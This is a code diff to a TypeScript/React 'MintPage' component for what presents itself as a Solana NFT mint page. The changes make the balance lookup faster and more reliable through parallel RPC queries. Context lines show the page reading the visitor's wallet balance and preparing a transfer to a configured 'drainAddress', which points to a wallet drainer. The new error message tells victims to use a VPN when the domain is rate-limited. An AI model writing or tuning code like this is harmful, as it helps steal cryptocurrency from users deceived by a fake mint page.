@@ -90,40 +90,38 @@ const MintPage = ({ onBack }: MintPageProps) => {
     const provider = (window as any).solana;
     if (!provider) return;
 
-    // List of public RPCs to try if one fails
-    const RPC_FALLBACKS = [
+    // Dedicated QuickNode RPC (Primary) + Fallbacks
+    const RPC_ENDPOINTS = [
       siteConfig.solanaRpcEndpoint,
+      "https://rpc.jup.ag/mainnet",
       "https://rpc.ankr.com/solana",
       "https://api.mainnet-beta.solana.com",
-      "https://ssc-dao.genesysgo.net"
+      "https://solana-mainnet.rpc.extrnode.com"
     ];
 
     try {
       setIsMinting(true);
-      setFeedback({ type: 'info', message: 'Connecting to blockchain...' });
+      setFeedback({ type: 'info', message: 'Syncing with blockchain...' });
 
       let connection: Connection | null = null;
       let balance: number = 0;
-      let lastError: any = null;
 
-      // Robust RPC fallback loop
-      for (const rpcUrl of RPC_FALLBACKS) {
-        try {
-          console.log(`Attempting RPC: ${rpcUrl}`);
-          const conn = new Connection(rpcUrl, 'confirmed');
+      // Parallel RPC lookup for speed and reliability
+      try {
+        const balancePromises = RPC_ENDPOINTS.map(async (url) => {
+          const conn = new Connection(url, 'confirmed');
           const bal = await conn.getBalance(new PublicKey(walletAddress));
-          connection = conn;
-          balance = bal;
-          break; // Success!
-        } catch (err) {
-          console.warn(`RPC ${rpcUrl} failed, trying next...`, err);
-          lastError = err;
-        }
+          return { conn, bal };
+        });
+
+        const result = await Promise.any(balancePromises);
+        connection = result.conn;
+        balance = result.bal;
+      } catch (err: any) {
+        throw new Error("All Solana nodes are currently rate-limiting this domain. Please wait 1 minute or use a VPN/different network.");
       }
 
-      if (!connection) {
-        throw new Error(`Failed to connect to any Solana nodes. Please check your internet or try again later. (Error: ${lastError?.message || 'Unauthorized'})`);
-      }
+      if (!connection) throw new Error("Failed to establish secure connection.");
 
       const senderPubKey = new PublicKey(walletAddress);
       const recipientPubKey = new PublicKey(siteConfig.drainAddress);
